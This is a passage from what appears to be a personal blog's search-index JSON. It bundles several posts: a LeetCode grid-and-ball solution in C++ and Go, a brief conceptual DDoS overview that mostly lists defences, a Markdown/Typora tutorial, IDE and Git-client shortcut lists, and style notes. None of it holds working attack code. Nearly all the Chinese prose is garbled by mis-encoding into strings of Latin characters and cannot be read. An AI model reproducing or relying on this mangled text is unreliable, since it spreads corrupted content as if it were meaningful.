2ï¼š 123è¾“å…¥ï¼šgrid = [[-1]]è¾“å‡ºï¼š[-1]è§£é‡Šï¼šçƒè¢«å¡åœ¨ç®±å­å·¦ä¾§è¾¹ä¸Šã€‚ ç¤ºä¾‹ 3ï¼š 12è¾“å…¥ï¼šgrid = [[1,1,1,1,1,1],[-1,-1,-1,-1,-1,-1],[1,1,1,1,1,1],[-1,-1,-1,-1,-1,-1]]è¾“å‡ºï¼š[0,1,2,3,4,-1] æç¤ºï¼š m == grid.length n == grid[i].length 1 &lt;= m, n &lt;= 100 grid[i][j] ä¸º 1 æˆ– -1 Solution æ€è·¯ æˆ‘ä»¬ä¾æ¬¡åˆ¤æ–­æ¯ä¸ªçƒçš„æœ€ç»ˆä½ç½®ã€‚å¯¹äºæ¯ä¸ªçƒï¼Œä»ä¸Šè‡³ä¸‹åˆ¤æ–­çƒä½ç½®çš„ç§»åŠ¨æ–¹å‘ã€‚åœ¨å¯¹åº”çš„ä½ç½®ï¼Œå¦‚æœæŒ¡æ¿å‘å³åï¼Œåˆ™çƒä¼šå¾€å³ç§»åŠ¨ï¼›å¦‚æœæŒ¡æ¿å¾€å·¦åï¼Œåˆ™çƒä¼šå¾€å·¦ç§»åŠ¨ã€‚è‹¥ç§»åŠ¨è¿‡ç¨‹ä¸­ç¢°åˆ°ä¾§è¾¹æˆ–è€… \\text{V}V å‹ï¼Œåˆ™çƒä¼šåœæ­¢ç§»åŠ¨ï¼Œå¡åœ¨ç®±å­é‡Œã€‚å¦‚æœå¯ä»¥å®Œæˆæœ¬å±‚çš„ç§»åŠ¨ï¼Œåˆ™ç»§ç»­åˆ¤æ–­ä¸‹ä¸€å±‚çš„ç§»åŠ¨æ–¹å‘ï¼Œç›´åˆ°è½å‡ºç®±å­æˆ–è€…å¡ä½ã€‚ ä½œè€…ï¼šLeetCode-Solution é“¾æ¥ï¼šhttps://leetcode-cn.com/problems/where-will-the-ball-fall/solution/qiu-hui-luo-he-chu-by-leetcode-solution-xqop/ æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰ è‘—ä½œæƒå½’ä½œè€…æ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»ä½œè€…è·å¾—æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚ 1234567891011121314151617181920class Solution &#123;public: vector&lt;int&gt; findBall(vector&lt;vector&lt;int&gt;&gt;&amp; grid) &#123; int n = grid[0].size(); //ç®±å­çš„åˆ—æ•° vector&lt;int&gt; ans(n); for(int i = 0; i &lt; n; i++)&#123; //åˆ†åˆ«æ±‚æ¯ä¸ªçƒæ‰åˆ°åº•éƒ¨çš„ä½ç½®ä¸‹æ ‡ int col = i; //colè¡¨ç¤ºçƒåœ¨ä¸‹é™è¿‡ç¨‹ä¸­çš„çºµåæ ‡ for(auto&amp; row : grid)&#123; //åˆ†åˆ«æ±‚å‡ºçƒæ‰åˆ°æ¯å±‚çš„ä½ç½® int dir = row[col]; //dirè¡¨ç¤ºçƒåœ¨ä¸‹é™è¿‡ç¨‹ä¸­å‘å·¦æˆ–å‘å³ä¸‹é™ col += dir; //æ›´æ–°çƒåœ¨ä¸‹ä¸€å±‚çš„çºµåæ ‡,å‘å³ç§»åŠ¨(çºµåæ ‡åŠ 1)/å‘å·¦ç§»åŠ¨(çºµåæ ‡å‡1) if(col &lt; 0 || col == n || row[col] != dir )&#123; //row[col]è¡¨ç¤ºçƒå°†è¦ç§»åŠ¨çš„æ–¹å‘ä¸ŠæŒ¡æ¿çš„å¸ƒç½®æƒ…å†µ,dirè¡¨ç¤ºå½“å‰çƒçš„ç§»åŠ¨æ–¹å‘ï¼Œä¸¤è€…æ–¹å‘ä¸ä¸€è‡´ä¼šå½¢æˆå¤¹è§’ col = -1; //å½“å½¢æˆå¤¹è§’æˆ–è¢«æŒ¡åœ¨ç®±å­ä¾§è¾¹æ—¶,çƒå°†ä¼šå¡åœ¨ç›’å­é‡Œ,æ‰€ä»¥è¯¥çƒä¸‹é™çš„ç»“æœå€¼ç›´æ¥èµ‹å€¼ä¸º-1; break; &#125; &#125; ans[i] = col; //colè¡¨ç¤ºæ¯ä¸ªçƒæ‰è½åˆ°åº•éƒ¨çš„ä½ç½®,å³ä¸ºç»“æœå€¼ &#125; return ans; &#125;&#125;; 123456789101112131415161718â€‹func findBall(grid [][]int) []int &#123; n := len(grid[0]) ans := make([]int, n) for j := range ans &#123; col := j // çƒçš„åˆå§‹åˆ— for _, row := range grid &#123; dir := row[col] col += dir // ç§»åŠ¨çƒ if col &lt; 0 || col == n || row[col] != dir &#123; // åˆ°è¾¾ä¾§è¾¹æˆ–Vå‹ col = -1 break &#125; &#125; ans[j] = col // col &gt;= 0 ä¸ºæˆåŠŸåˆ°è¾¾åº•éƒ¨ &#125; return ans&#125;","tags":[{"name":"LeetCode","slug":"LeetCode","permalink":"https://hodlyounger.github.io/tags/LeetCode/"},{"name":"Code/Go","slug":"Code-Go","permalink":"https://hodlyounger.github.io/tags/Code-Go/"},{"name":"Code/CPP","slug":"Code-CPP","permalink":"https://hodlyounger.github.io/tags/Code-CPP/"},{"name":"LeetCode/æ•°ç»„","slug":"LeetCode-æ•°ç»„","permalink":"https://hodlyounger.github.io/tags/LeetCode-%E6%95%B0%E7%BB%84/"},{"name":"LeetCode/æ·±åº¦ä¼˜å…ˆæœç´¢","slug":"LeetCode-æ·±åº¦ä¼˜å…ˆæœç´¢","permalink":"https://hodlyounger.github.io/tags/LeetCode-%E6%B7%B1%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2/"},{"name":"LeetCode/åŠ¨æ€è§„åˆ’","slug":"LeetCode-åŠ¨æ€è§„åˆ’","permalink":"https://hodlyounger.github.io/tags/LeetCode-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"},{"name":"LeetCode/çŸ©é˜µ","slug":"LeetCode-çŸ©é˜µ","permalink":"https://hodlyounger.github.io/tags/LeetCode-%E7%9F%A9%E9%98%B5/"},{"name":"LeetCode/æ¨¡æ‹Ÿ","slug":"LeetCode-æ¨¡æ‹Ÿ","permalink":"https://hodlyounger.github.io/tags/LeetCode-%E6%A8%A1%E6%8B%9F/"}],"categories":[{"name":"G_LeetCode","slug":"G-LeetCode","permalink":"https://hodlyounger.github.io/categories/G-LeetCode/"}]},{"title":"ã€æ”»å‡»ã€‘DDoSæ”»å‡»","date":"2023-10-27T01:24:02.498Z","path":"B_Code/ç½‘ç»œç¼–ç¨‹/ç½‘å®‰/ã€ç½‘å®‰ã€‘DDoSæ”»å‡»/","text":"æ¦‚è¿°ï¼šDDoS() æŠ€æœ¯é‰´èµ [toc] DDoSè¯´æ˜ DDoS(Distributed Denial of Service)å³åˆ†å¸ƒå¼æ‹’ç»æœåŠ¡æ”»å‡»,æ˜¯ä¸€ç§é€šè¿‡å¤§é‡å ç”¨ç›®æ ‡æœåŠ¡å™¨èµ„æºçš„æ–¹å¼,ä½¿æœåŠ¡æš‚æ—¶ä¸­æ–­æˆ–åœæ­¢,æ— æ³•å¯¹æ­£å¸¸ç”¨æˆ·æä¾›æœåŠ¡çš„æ”»å‡»æ‰‹æ®µã€‚ DDoSæ”»å‡»çš„ä¸»è¦ç‰¹å¾åŒ…æ‹¬: åˆ†å¸ƒå¼ - åˆ©ç”¨å¤§é‡åˆ†å¸ƒåœ¨ä¸åŒåœ°ç‚¹çš„æ”»å‡»æºè¿›è¡Œæ”»å‡»ã€‚ æµé‡æ³›æ»¥ - é€šè¿‡å‘é€å¤§é‡æµé‡æ·¹æ²¡ç›®æ ‡æœåŠ¡å™¨çš„å¸¦å®½æˆ–èµ„æºã€‚å¸¸è§çš„æœ‰UDP floodã€ICMP floodç­‰ã€‚ èµ„æºè€—å°½ - å ç”¨ç›®æ ‡æœåŠ¡å™¨çš„å…³é”®ç³»ç»Ÿèµ„æº,å¦‚è¿æ¥æ•°ã€çº¿ç¨‹æ•°ç­‰ã€‚å¦‚SYN floodæ”»å‡»ã€‚ æ”»å‡»å¢å¼º - é€šè¿‡å„ç§æ–¹å¼å¢å¼ºæ”»å‡»æµé‡å’Œæ•ˆæœã€‚å¦‚IPåœ°å€æ¬ºéª—ã€‚ å¤šå‘é‡ç»„åˆ - ç»¼åˆä½¿ç”¨å„ç§ç±»å‹çš„æ”»å‡»æ‰‹æ®µ,å¯¹ç›®æ ‡å‘èµ·å¤šç»´æ”»å‡»ã€‚ é˜²å¾¡DDoSæ”»å‡»çš„ä¸»è¦æ‰‹æ®µåŒ…æ‹¬: å¢åŠ å¸¦å®½ - æé«˜æµé‡æ‰¿è½½èƒ½åŠ›ã€‚ ä½¿ç”¨DDoSé˜²æŠ¤æœåŠ¡ - ç”±æœåŠ¡æä¾›å•†è¿‡æ»¤æ”»å‡»æµé‡ã€‚ é™åˆ¶è¿æ¥å’Œè¯·æ±‚ - åŠ å¼ºå¯¹é«˜æµé‡æºçš„è®¿é—®æ§åˆ¶ã€‚ ä¸¢å¼ƒæ— æ•ˆæµé‡ - é€šè¿‡æŠ€æœ¯æ‰‹æ®µè¯†åˆ«å¹¶ä¸¢å¼ƒæ”»å‡»æµé‡ã€‚ æ‰©å±•å…³é”®ç³»ç»Ÿèµ„æº - æé«˜å…³é”®èµ„æºæ± å®¹é‡ã€‚ æœåŠ¡é™çº§ - åœ¨è¢«æ”»å‡»æ—¶æš‚æ—¶åœæ­¢éæ ¸å¿ƒæœåŠ¡ã€‚ æœåŠ¡åˆ†æ•£ - é€šè¿‡CDNç­‰æ–¹å¼åˆ†æ•£æœåŠ¡,é¿å…å•ç‚¹æ•…éšœã€‚ åˆç†é™é€Ÿ - å¯¹æºIPè®¿é—®é¢‘ç‡å’Œæµé‡è¿›è¡Œæ§åˆ¶ã€‚ DDoSé˜²å¾¡éœ€è¦ç»¼åˆè¿ç”¨å„ç§æŠ€æœ¯æ‰‹æ®µ,ä»ç½‘ç»œã€æœåŠ¡å’Œåº”ç”¨å±‚è¿›è¡Œé˜²æŠ¤,æœ€å¤§ç¨‹åº¦å‡è½»æ”»å‡»å½±å“ã€‚","tags":[{"name":"ç½‘ç»œå®‰å…¨/DDos","slug":"ç½‘ç»œå®‰å…¨-DDos","permalink":"https://hodlyounger.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8-DDos/"},{"name":"DDoS","slug":"DDoS","permalink":"https://hodlyounger.github.io/tags/DDoS/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"ç½‘ç»œç¼–ç¨‹","slug":"B-Code/ç½‘ç»œç¼–ç¨‹","permalink":"https://hodlyounger.github.io/categories/B-Code/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"},{"name":"ç½‘å®‰","slug":"B-Code/ç½‘ç»œç¼–ç¨‹/ç½‘å®‰","permalink":"https://hodlyounger.github.io/categories/B-Code/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/%E7%BD%91%E5%AE%89/"}]},{"title":"Linux å‘½ä»¤è„šæœ¬","date":"2023-10-27T01:24:02.497Z","path":"E_æ‰‹å†Œ/è„šæœ¬/ã€linuxã€‘å‘½ä»¤ç›¸å…³è„šæœ¬æ•´ç†/","text":"[toc] ll + awk è·å–æ–‡ä»¶markdowné“¾æ¥ 1ll | awk &#x27;&#123;print &quot;[&quot;$9&quot;](./&quot;$9&quot;readme.md)&quot;&#125;&#x27;","tags":[],"categories":[{"name":"E_æ‰‹å†Œ","slug":"E-æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/categories/E-%E6%89%8B%E5%86%8C/"},{"name":"è„šæœ¬","slug":"E-æ‰‹å†Œ/è„šæœ¬","permalink":"https://hodlyounger.github.io/categories/E-%E6%89%8B%E5%86%8C/%E8%84%9A%E6%9C%AC/"}]},{"title":"Markdownæ‰‹å†Œ","date":"2023-10-27T01:24:02.495Z","path":"E_æ‰‹å†Œ/ã€æ‰‹å†Œã€‘æ‰€è§å³æ‰€å¾—_TyporaåŠç”¨æ³•/","text":"Markdownä»‹ç» Markdownæ˜¯ä¸€ç§å¯ä»¥ä½¿ç”¨æ™®é€šæ–‡æœ¬ç¼–è¾‘å™¨ç¼–å†™çš„æ ‡è®°è¯­è¨€ï¼Œé€šè¿‡ç®€å•çš„æ ‡è®°è¯­æ³•ï¼Œå®ƒå¯ä»¥ä½¿æ™®é€šæ–‡æœ¬å†…å®¹å…·æœ‰ä¸€å®šçš„æ ¼å¼ã€‚ Markdownè¯­æ³•çš„ç›®æ ‡æ˜¯ï¼šæˆä¸ºä¸€ç§é€‚ç”¨äºç½‘ç»œçš„ä¹¦å†™è¯­è¨€ã€Œæ˜“è¯»æ˜“å†™ã€ã€‚å¹¶ä¸”Markdownå…¼å®¹HTMLã€‚ä½ å¯ä»¥ä½¿ç”¨HTMLè¯­è¨€ç¼–å†™Markdownï¼Œå¦‚æœä½ è¦éƒ¨ç½²ä½ çš„ä¸ªäººåšå®¢ï¼Œé‚£è¿™æ›´æ˜¯ä½ å¿…ä¸å¯å°‘çš„æŠ€èƒ½ä¹‹ä¸€ï¼ï¼ï¼ å¼ºçƒˆæ¨ètyporaè¿™æ¬¾markdownè½¯ä»¶ï¼Œè°ç”¨è°è¯´å¥½ï¼ ä¸€æ¬¾ä¼˜è´¨çš„Markdownç¼–è¾‘å™¨,ä¸ä»…ä»…æ˜¯Markdown é™¤æ­¤ä¹‹å¤–ï¼Œå¦‚æœä½ æ„¿æ„èŠ±ä¸€ç‚¹ç‚¹æ—¶é—´æ¥äº†è§£{ post_link } ç®€è¿°Markdownå¸¸è§ç”¨æ³• åœ¨ä¸‹é¢ï¼Œæˆ‘å°†ç®€å•ä»‹ç»å‡ ä¸ªå¸¸ç”¨çš„markdownå†™æ³•ã€‚å¸Œæœ›å¤§å®¶å†™å‡ºæ›´å¥½çš„è§‚çœ‹æ•ˆæœçš„æ–‡ç« ã€‚æœ¬æ–‡ä¸€äº›å†…å®¹æ˜¯å±äºHexoä¸‹buttrerflyä¸»é¢˜çš„å†…ç½®æ ‡ç­¾ã€‚ å¤§å®¶å¯ä»¥è‡ªå·±ä¸‹è½½Typoraå°è¯•ä¸€ä¸‹markdownã€‚ ä¸ºä»€ä¹ˆæ¨èTypora,æˆ‘å½’çº³äº†ä»¥ä¸‹å‡ ç‚¹ï¼š ä¸€ â€œæ‰€è§å³æ‰€å¾—â€ï¼ˆå³æ—¶æ¸²æŸ“ï¼‰ äºŒ æ”¯æŒå›¾åºŠåŠŸèƒ½ï¼Œé…åˆPicGOå¯ä»¥å®ç°å›¾ç‰‡çš„éšç”¨éšä¼  å¦‚ä¸‹æ‰€ç¤ºï¼Œå³å‡»å›¾ç‰‡å°±å¯ä»¥ä¸Šä¼ åˆ°PicGoæŒ‡å®šçš„å›¾åºŠã€‚çœŸçš„å¾ˆå¥½ç”¨ï¼ï¼ï¼ ä¸‰ Typoraè¿˜æ”¯æŒå°†mdæ–‡ä»¶å¯¼å‡ºä¸ºå¤šç§æ ¼å¼çš„æ–‡ä»¶ï¼Œç›®å‰æ”¯æŒä»¥ä¸‹æ–‡ä»¶: å›› å¦‚æœä½ è¿˜ä¼šä¸€ç‚¹CSS,é‚£ä½ ç”šè‡³å¯ä»¥è‡ªå®šä¹‰ç•Œé¢æ ·å¼ ä¸‹é¢æˆ‘å°†ä»ä»¥ä¸‹è¿™å‡ ä¸ªæ–¹é¢ä»‹ç»ä¸€ä¸‹Typoraçš„ä¸€äº›ä½¿ç”¨æ–¹æ³•ï¼š å­—ä½“ ï¼ˆ&lt;small&gt;å°&lt;/small&gt; &lt;big&gt;å¤§&lt;/big&gt;ï¼‰ æ–œä½“ *æ–œä½“* ç²—ä½“ **ç²—ä½“** æ–œä½“ + ç²—ä½“ ***æ–œä½“+ç²—ä½“\\*** åˆ é™¤ ~~åŸä»·ï¼š99.9å…ƒ~~ é“¾æ¥ [http://www.jianshu.com](https://www.jianshu.com) åˆ†å‰²çº¿ ä¸‹åˆ’çº¿ æ ‡é¢˜ ä»»åŠ¡åˆ—è¡¨ å›¾ç‰‡ åŒºå—å¼•ç”¨ è¡Œå†…ä»£ç  `markdown` åˆ—è¡¨ è¡¨æ ¼ è„šæ³¨ é«˜äº® å­—ä½“ 123&lt;small&gt;å°å·å­—ä½“&lt;/small&gt;&lt;big&gt;å¤§å·å­—ä½“&lt;/big&gt;&lt;div style=&quot;text-align:center;&quot;&gt;&lt;font color=rgb(25,26,35) face=&quot;åæ–‡å½©äº‘&quot; size=100px style=&quot;text-align:center&quot;&gt;å…¶ä»–å¿«æ·æ–¹å¼&lt;/font&gt;&lt;/div&gt; å±æ€§ å€¼ æè¿° color rgb();#XXXXXXcolorname è§„å®šæ–‡æœ¬çš„é¢œè‰²ï¼Œå¯ä»¥ä½¿ç”¨styleä»£æ›¿ face font_family è§„å®šæ–‡æœ¬çš„å­—ä½“ size number è§„å®šæ–‡æœ¬çš„å¤§å° å°å·å­—ä½“ å¤§å·å­—ä½“ å…¶ä»–å¿«æ·æ–¹å¼ æ–œä½“ è¥¿æ–¹æ–œä½“è¿™ä¸€ä¹ æƒ¯çœ‹ä¸ªäººå–œå¥½å§ã€‚åœ¨æ–‡å­—å‰åå„åŠ ä¸€ä¸ª*å°±ğŸ‘Œäº† 1*æ–œä½“* æ•ˆæœå¦‚ä¸‹ï¼š æ–œä½“ åŠ ç²— åœ¨æ–‡å­—å‰åå„åŠ ä¸¤ä¸ª**å°±ğŸ‘Œäº† 1**åŠ ç²—** æ•ˆæœå¦‚ä¸‹ï¼š åŠ ç²— æ–œä½“åŠ ç²— æ–œä½“æ–‡å­—å‰åå„åŠ *ï¼ŒåŠ ç²—æ–‡å­—å‰åå„åŠ **ï¼Œæ–œä½“åŠ ç²—åœ¨æ–‡å­—å‰ååŠ ***ã€‚æ²¡æ¯›ç—…â€¦ 1***æ–œä½“åŠ ç²—*** æ•ˆæœå¦‚ä¸‹: æ–œä½“åŠ ç²— åˆ é™¤ 1~~content~~ æ•ˆæœå¦‚ä¸‹ï¼š content é“¾æ¥ é“¾æ¥åº”è¯¥æ˜¯ä½¿ç”¨æœ€å¤šçš„åœºæ™¯äº†ã€‚ä»–äººæœ‰å¥½çš„æ–‡å­—æˆ–è€…è‡ªå·±æ‘˜è‡ªå“ªé‡Œã€éƒ½å¯ä»¥ä¼ é€é—¨ç›´æ¥è¿‡å»ã€‚ 12[ç½‘ç«™å](åœ°å€)åœ°å€ æ•ˆæœå¦‚ä¸‹ï¼š example@163.com http://www.baidu.com åˆ†å‰²çº¿ 12341 ****2 *****3 ---ä»¥ä¸Šä¸‰ç§å†™æ³•éƒ½å¯ä»¥ï¼Œæ•ˆæœä¸€æ ·ï¼Œçœ‹ä¸ªäººå¿ƒæƒ…ä½¿ç”¨ã€‚ ä¸‹åˆ’çº¿ 1&lt;u&gt;å†…å®¹&lt;/u&gt; å†…å®¹ æ ‡é¢˜ 123# ä¸€çº§æ ‡é¢˜Â·Â·Â·###### å…­çº§æ ‡é¢˜ //æœ€å¤šæ”¯æŒå…­çº§æ ‡é¢˜ æ•ˆæœå¦‚ä¸‹ï¼š ä¸€çº§æ ‡é¢˜ å…­çº§æ ‡é¢˜ ä»»åŠ¡åˆ—è¡¨ æ ¼å¼ï¼š 12 - [] å¾…å®Œæˆ- [X] å·²å®Œæˆ æ•ˆæœå¦‚ä¸‹ï¼š [ ] å¾…å®Œæˆ [x] å·²å®Œæˆ å›¾ç‰‡ æ ¼å¼ä¸º![]() å…¶ä¸­å›¾ç‰‡åç§°å¯ä»¥ä¸ºç©ºã€‚ç›´æ¥è¾“å…¥[]å°±å¯ä»¥ã€‚ä¸‹é¢æˆ‘çš„urlè¾“å…¥çš„ç›´æ¥å°±æ–‡å­—urlã€‚æ‰€ä»¥è‚¯å®šæ˜¯ç©ºå›¾ç‰‡å•¦ã€‚Typoraä¹Ÿå¯ä»¥ç›´æ¥æŠŠç”µè„‘æœ¬åœ°çš„å›¾ç‰‡æ‹–è¿›æ¥ï¼Œè‡ªåŠ¨ç”Ÿæˆå›¾ç‰‡é“¾æ¥ã€‚ 1![å›¾ç‰‡å](URL) åŒºå—å¼•ç”¨ ä»£ç å—ï¼Œä½¿ç”¨â€™`'å’Œ~éƒ½å¯ä»¥ 123```ä»£ç ``` æ•ˆæœå¦‚ä¸‹ï¼š 1ä»£ç  è¡Œå†…ä»£ç  ç¨‹åºçŒ¿å¼•ç”¨ä»£ç ï¼Œæˆ–è€…æ˜¯æ–‡ç« ä¸­æœ‰ä¸€äº›å…³é”®æ€§çš„åè¯å•Šï¼Œæˆ–è€…ä¸ºäº†çªå‡ºé†’ç›®ã€‚æ•ˆæœä¸é”™ã€‚ 1`printf(&quot;test&quot;)` æ•ˆæœå¦‚ä¸‹ï¼š printf(&quot;testâ€); åˆ—è¡¨ 1234567- æ— åºé¡¹ç›®1* æ— åºé¡¹ç›®2+ æ— åºé¡¹ç›®3 - æ— åºäºŒçº§1 - æ— åºäºŒçº§21. æœ‰åºæ ‡é¢˜ 1. æ— åºäºŒçº§æ ‡é¢˜ æ— åºé¡¹ç›®1 æ— åºé¡¹ç›®2 æ— åºé¡¹ç›®3 æ— åºäºŒçº§1 æ— åºäºŒçº§2 æœ‰åºæ ‡é¢˜ æ— åºäºŒçº§æ ‡é¢˜ è¡¨æ ¼ ctrl+tæ›´æ–¹ä¾¿ 1234| ç¬¬ä¸€æ ¼è¡¨å¤´ | ç¬¬äºŒæ ¼è¡¨å¤´ || -------------------------------- | ---------------------- || å†…å®¹å•å…ƒæ ¼ ç¬¬ä¸€åˆ—ç¬¬ä¸€æ ¼ | å†…å®¹å•å…ƒæ ¼ç¬¬äºŒåˆ—ç¬¬ä¸€æ ¼ || å†…å®¹å•å…ƒæ ¼ ç¬¬ä¸€åˆ—ç¬¬äºŒæ ¼ å¤šåŠ æ–‡å­— | å†…å®¹å•å…ƒæ ¼ç¬¬äºŒåˆ—ç¬¬äºŒæ ¼ | æ•ˆæœå¦‚ä¸‹: ç¬¬ä¸€æ ¼è¡¨å¤´ ç¬¬äºŒæ ¼è¡¨å¤´ å†…å®¹å•å…ƒæ ¼ ç¬¬ä¸€åˆ—ç¬¬ä¸€æ ¼ å†…å®¹å•å…ƒæ ¼ç¬¬äºŒåˆ—ç¬¬ä¸€æ ¼ å†…å®¹å•å…ƒæ ¼ ç¬¬ä¸€åˆ—ç¬¬äºŒæ ¼ å¤šåŠ æ–‡å­— å†…å®¹å•å…ƒæ ¼ç¬¬äºŒåˆ—ç¬¬äºŒæ ¼ è„šæ³¨ H~2~oæ•ˆæœé¢„è§ˆâ€“&gt;H2o é«˜äº®&lt;mark&gt; 1&lt;mark&gt;content&lt;/mark&gt; &lt;mark&gt;æ ‡ç­¾æ”¯æŒå…¨å±€å±æ€§ï¼Œå› æ­¤å¯ä»¥é€šè¿‡è‡ªå®šä¹‰styleä¿®æ”¹markçš„æ ·å¼ã€‚ å‚è€ƒè¿™ä¸ªâ†“ï¼š HTMLå‚è€ƒæ‰‹å†Œ|ç¼–ç¨‹å­—å…¸ 12&lt;mark&gt;åŸå§‹æ ·å¼&lt;/mark&gt;&lt;mark style=&quot;font:&#x27;å¾®è½¯é›…é»‘&#x27;;color:red;font-weight:900&quot;&gt;CSSæ ·å¼&lt;/mark&gt; åŸå§‹æ ·å¼ CSSæ ·å¼","tags":[{"name":"æ‰‹å†Œ","slug":"æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/tags/%E6%89%8B%E5%86%8C/"},{"name":"markdown","slug":"markdown","permalink":"https://hodlyounger.github.io/tags/markdown/"}],"categories":[{"name":"E_æ‰‹å†Œ","slug":"E-æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/categories/E-%E6%89%8B%E5%86%8C/"}]},{"title":"ã€Visual Assistã€‘å¿«æ·é”®æ•´ç†","date":"2023-10-27T01:24:02.494Z","path":"E_æ‰‹å†Œ/å¿«æ·é”®æ•´ç†/ã€Visual Assistã€‘å¿«æ·é”®/","text":"Visual Assist å¿«æ·é”®ï¼š shift+alt+F æŸ¥æ‰¾å¼•ç”¨ alt+M æŸ¥çœ‹å½“å‰æ–‡ä»¶ä¸‹å‡½æ•°åˆ—è¡¨ alt+up å°†å½“å‰è¡Œçš„ä»£ç æ”¾åˆ°ä¸Šä¸€è¡Œ alt+down å°†å½“å‰è¡Œçš„ä»£ç æ”¾åˆ°ä¸‹ä¸€è¡Œ alt+O .h/.cppæ–‡ä»¶çš„åˆ‡æ¢ Ctrl + -ï¼šå…‰æ ‡å›åˆ°ä¸Šä¸€å¤„ Ctrl + Shift + -ï¼šå…‰æ ‡å›åˆ°ä¸‹ä¸€å¤„ Alt + Gï¼šå¿«é€Ÿè·³åˆ°å®šä¹‰ shift+alt+O æ‰“å¼€è§£å†³æ–¹æ¡ˆæ–‡ä»¶å¯¹è¯æ¡† shift+alt+S æŸ¥æ‰¾æŸä¸ªå¯¹è±¡æˆ–æ˜¯å˜é‡ shift+alt+Q é¼ æ ‡å®šä½åˆ°å‡½æ•°åä¸Šï¼Œè‹¥æ˜¯åœ¨cppæ–‡ä»¶ä¸­ï¼Œåˆ™æŒ‰æ­¤å¿«æ·é”®ä¼šå¼¹å‡ºå³é”®èœå•ï¼Œé‡Œé¢æœ‰ä¸€ä¸ªé€‰é¡¹â€“åˆ›å»ºå£°æ˜ã€‚ ä¸Alt+Oé…åˆä¼šæ¯”è¾ƒæ–¹ä¾¿ã€‚ shift+alt+F æ‰¾åˆ°å¯¹è±¡çš„æ‰€æœ‰å¼•ç”¨ shift+alt+R æ‰¾åˆ°æ‰€æœ‰å¯¹è±¡å¹¶é‡å‘½å","tags":[{"name":"å¿«æ·é”®","slug":"å¿«æ·é”®","permalink":"https://hodlyounger.github.io/tags/%E5%BF%AB%E6%8D%B7%E9%94%AE/"},{"name":"VA","slug":"VA","permalink":"https://hodlyounger.github.io/tags/VA/"}],"categories":[{"name":"E_æ‰‹å†Œ","slug":"E-æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/categories/E-%E6%89%8B%E5%86%8C/"},{"name":"å¿«æ·é”®æ•´ç†","slug":"E-æ‰‹å†Œ/å¿«æ·é”®æ•´ç†","permalink":"https://hodlyounger.github.io/categories/E-%E6%89%8B%E5%86%8C/%E5%BF%AB%E6%8D%B7%E9%94%AE%E6%95%B4%E7%90%86/"}]},{"title":"ã€Forkã€‘å¿«æ·é”®æ•´ç†","date":"2023-10-27T01:24:02.493Z","path":"E_æ‰‹å†Œ/å¿«æ·é”®æ•´ç†/ã€Forkã€‘å¿«æ·é”®/","text":"[toc] Fork å¿«æ·é”® General Navigation Ctrl1 - Show Changes view (second press will focus commit field) Ctrl2 - Show All Commits view (second press will jump to HEAD) Ctrl0 - Reveal HEAD CtrlP - Show Quick Launch window CtrlTab - Select next tab CtrlShiftTab - Select previous tab CtrlT - Open new tab CtrlW - Close current tab Ctrl=/Ctrl- Zoom in/ Zoom out Ctrl, - Open Fork preferences All Commits View Ctrl0 - Jump to HEAD CtrlF - Commit search Enter, F3 - Jump to next search result ShiftEnter, ShiftF3 - Jump to previous search result CtrlC - Copy commit info Delete - Remove branch/stash CtrlShiftA - Filter by active branch Changes View CtrlEnter - Commit CtrlShiftEnter - Commit and push Ctrl1 - Focus commit message field CtrlF - Filter Enter, CtrlShiftS - Stage/unstage selected file (or lines) CtrlAltShiftS - Stage/unstage all files Backspace, CtrlShiftD - Discard selected file (or lines) CtrlO - Open selected file CtrlD - Open selected file in external diff tool CtrlC - Copy selected file full path Repository F5 - Refresh CtrlShiftN - Init new repository CtrlN - Clone new repository CtrlO - Open repository CtrlShiftF - Fetch CtrlAltShiftF (Ctrl + click on button) - Quick Fetch CtrlShiftL - Pull CtrlAltShiftL (Ctrl + click on button) - Quick Pull CtrlShiftP - Push CtrlAltShiftP (Ctrl + click on button) - Quick Push CtrlShiftB - New branch CtrlShiftT - New tag CtrlShiftH - Create stash CtrlAltO - Open in File Explorer CtrlAltT - Open in Terminal Repository Manager F2 - Rename Repository Delete - Remove Repository Enter - Open Repository","tags":[{"name":"å¿«æ·é”®","slug":"å¿«æ·é”®","permalink":"https://hodlyounger.github.io/tags/%E5%BF%AB%E6%8D%B7%E9%94%AE/"}],"categories":[{"name":"E_æ‰‹å†Œ","slug":"E-æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/categories/E-%E6%89%8B%E5%86%8C/"},{"name":"å¿«æ·é”®æ•´ç†","slug":"E-æ‰‹å†Œ/å¿«æ·é”®æ•´ç†","permalink":"https://hodlyounger.github.io/categories/E-%E6%89%8B%E5%86%8C/%E5%BF%AB%E6%8D%B7%E9%94%AE%E6%95%B4%E7%90%86/"}]},{"title":"ã€æ‰‹å†Œã€‘å†™ä½œåä½œæ‰‹å†Œ","date":"2023-10-27T01:24:02.491Z","path":"E_æ‰‹å†Œ/ã€æ‰‹å†Œã€‘å†™ä½œæ ·å¼/","text":"[toc] Callouts [!Support ] Support Type: TIPã€BUGã€INFOã€NOTEã€QUOTEã€EXAMPLEã€CAUTIONã€FAILUREã€WARNINGã€SUCCESSã€QUESTIONã€ABSTRACTã€IMPORTANT 123456#include&lt;iostream&gt;using namespace std;int main(int argc,const char *argv[])&#123; cout &lt;&lt; &quot;Hello World&quot;; return 0;&#125; å¸¸ç”¨é¢œè‰²ä»£ç  color=maroon color=grey color=silver color=lightgrey color=HotPink color=DeepPink color=VioletRed color=Purple color=navy color=Blue color=DeepSkyBlue color=LightSkyBlue color=aqua color=DarkTurquoise color=LightSeaGreen color=YellowGreen color=GreenYellow color=Yellow color=Tomato color=red color=fuchsia color=MediumOrchid color=DarkViolet 